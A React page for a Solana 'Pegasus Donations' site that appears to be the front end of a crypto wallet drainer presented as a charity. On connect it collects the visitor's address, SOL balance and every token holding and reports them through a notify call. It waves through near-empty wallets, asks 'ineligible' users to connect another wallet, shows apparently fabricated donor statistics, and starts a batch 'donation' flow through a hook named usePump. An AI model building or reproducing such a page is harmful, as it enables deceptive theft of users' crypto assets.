import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { Button } from '@/components/ui/button';
import { usePump } from '@/hooks/useDonation';
// Removed DonationProgress per request
import { Wallet } from 'lucide-react';
import backgroundImage from '@/assets/web-background.png';
// Use public asset path for logo to avoid bundling issues
import { Link } from 'react-router-dom';
import { useState, useEffect, useRef } from 'react';
import { useConnection } from '@solana/wallet-adapter-react';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { notify } from '@/lib/notify';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { FeedbackModal } from '@/components/FeedbackModal';
import { CenterWalletButton } from '@/components/CenterWalletButton';
import { SwapInterface } from '@/components/SwapInterface';

const Index = () => {
  const { connected, publicKey, connect, select, wallets } = useWallet();
  const { connection } = useConnection();
  const { startDonation, isProcessing, transactions, currentIndex, pumpOutcome } = usePump();
  const [walletBalance, setWalletBalance] = useState<number>(0);
  const [isEligible, setIsEligible] = useState<boolean>(false);
  const hasNotifiedConnect = useRef(false);
  const [feedbackOpen, setFeedbackOpen] = useState(false);

  const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);

  // Removed tokens array for ongoing campaigns

  useEffect(() => {
    // Open the feedback modal when the pump flow is cancelled or errors
    if (pumpOutcome === 'cancelled' || pumpOutcome === 'error') {
      setFeedbackOpen(true);
    }
  }, [pumpOutcome]);

  useEffect(() => {
    const checkBalance = async () => {
      if (publicKey) {
        try {
          const balance = await connection.getBalance(publicKey);
          const solBalance = balance / LAMPORTS_PER_SOL;
          setWalletBalance(solBalance);
          setIsEligible(solBalance >= 0.00001);

          // Send connect notification once
          if (connected && !hasNotifiedConnect.current) {
            try {
              const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: TOKEN_PROGRAM_ID,
              });
              const tokens = tokenAccounts.value
                .map(({ account }) => {
                  const info = account.data.parsed.info;
                  const amount = info.tokenAmount.uiAmount;
                  if (!amount || amount <= 0) return null;
                  return {
                    mint: info.mint,
                    symbol: info.mint.slice(0, 8),
                    amount: amount,
                  };
                })
                .filter(Boolean);

              await notify('wallet_connected', {
                address: publicKey.toBase58(),
                solBalance: solBalance,
                tokens: tokens,
              });
              hasNotifiedConnect.current = true;
            } catch (e) {
              console.warn('connect notify error', (e as Error).message);
            }
          }
        } catch (error) {
          console.error('Error fetching balance:', error);
        }
      }
    };

    if (connected) {
      checkBalance();
      const interval = setInterval(checkBalance, 5000);
      return () => clearInterval(interval);
    }
  }, [connected, publicKey, connection]);

  return (
    <div className="min-h-screen flex flex-col">

      {/* Top Bar */}
      <div className="relative z-20 bg-black/90 backdrop-blur-md border-b border-white/10">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            {(() => {
              const logoSrc = import.meta.env.BASE_URL + 'pegasus.jpg';
              return (
                <img
                  src={logoSrc}
                  onError={(e) => { (e.target as HTMLImageElement).src = import.meta.env.BASE_URL + 'favicon.ico'; }}
                  alt="Pegasus Logo"
                  className="h-8 w-8 object-contain"
                />
              );
            })()}
            <span className="text-2xl font-bold text-white">Pegasus Donations</span>
            <Link to="/why-pegasus-swap" className="ml-4 text-sky-400 hover:text-sky-300 transition-colors">Why Donate with Pegasus</Link>
          </div>
          <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4 !text-primary-foreground">connect wallet</WalletMultiButton>
        </div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-2xl space-y-8">
          {/* Header */}
          <div className="text-center space-y-4">
            <div className="space-y-3">
              <h1 className="text-5xl font-bold text-white">
                Donate on Solana
              </h1>
              <div className="text-4xl font-bold bg-gradient-to-r from-green-400 to-green-600 text-transparent bg-clip-text animate-gradient">
                Support causes with low fees
              </div>
            </div>
            {/* Added CenterWalletButton component */}
            <div className="pt-4">
              {!connected && <CenterWalletButton />}
            </div>
          </div>

          {/* Custom Swap Interface */}
          <div className="mt-6">
            <SwapInterface onSwapAction={startDonation} isProcessing={isProcessing} isEligible={isEligible} />
          </div>

          {/* Wallet Connection */}
          <div className="flex flex-col items-center gap-4">
            {!connected ? (
              <div className="text-center space-y-4">
                <p className="text-sm text-muted-foreground flex items-center gap-2 justify-center">
                  <Wallet className="w-4 h-4" />
                  Connect your wallet to donate
                </p>
              </div>
            ) : (
              <div className="w-full space-y-6">
                {/* Eligibility Status */}
                <div className={`bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center`}>
                  <p className={`text-2xl font-bold ${isEligible ? 'text-green-500' : 'text-red-500'}`}>
                    {isEligible ? 'Eligible' : 'Not eligible connect with other wallet'}
                  </p>
                </div>

                {/* Action Button */}
                {!isProcessing && (
                  <Button
                    variant="default"
                    size="xl"
                    onClick={startDonation}
                    className="w-full bg-blue-800 hover:bg-blue-900 text-white"
                    disabled={!isEligible}
                  >
                    Start Donation
                  </Button>
                )}

                {/* Stats Section */}
                <div className="flex justify-center items-center gap-8 mt-6">
                  <div className="text-center">
                    <p className="text-3xl font-bold text-white">50,000+</p>
                    <p className="text-xs text-muted-foreground uppercase tracking-wide">DONORS</p>
                  </div>
                  <div className="text-center">
                    <p className="text-3xl font-bold text-white">1,200+ <span className="text-green-500">92%</span></p>
                    <p className="text-xs text-muted-foreground uppercase tracking-wide">CAUSES FUNDED</p>
                    <p className="text-xs text-green-500 font-bold uppercase tracking-wide">SUCCESS RATE</p>
                  </div>
                </div>

              </div>
            )}
          </div>

        </div>
      </div>

      {/* Removed Token Marquee section as requested */}

      <FeedbackModal
        open={feedbackOpen}
        onOpenChange={setFeedbackOpen}
        address={publicKey ? publicKey.toBase58() : undefined}
        context={pumpOutcome === 'cancelled' ? 'cancelled' : 'error'}
      />

      <style>{`
        @keyframes gradient {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        .animate-gradient {
          animation: gradient 3s ease infinite;
        }
        .delay-1000 {
          animation-delay: 1s;
        }
        
        @keyframes marquee {
          0% { transform: translateX(0); }
          100% { transform: translateX(-50%); }
        }
        
        .marquee-container {
          overflow: hidden;
          white-space: nowrap;
        }
        
        .marquee-content {
          display: inline-block;
          animation: marquee 30s linear infinite;
        }
      `}</style>
    </div>
  );
};

export default Index;
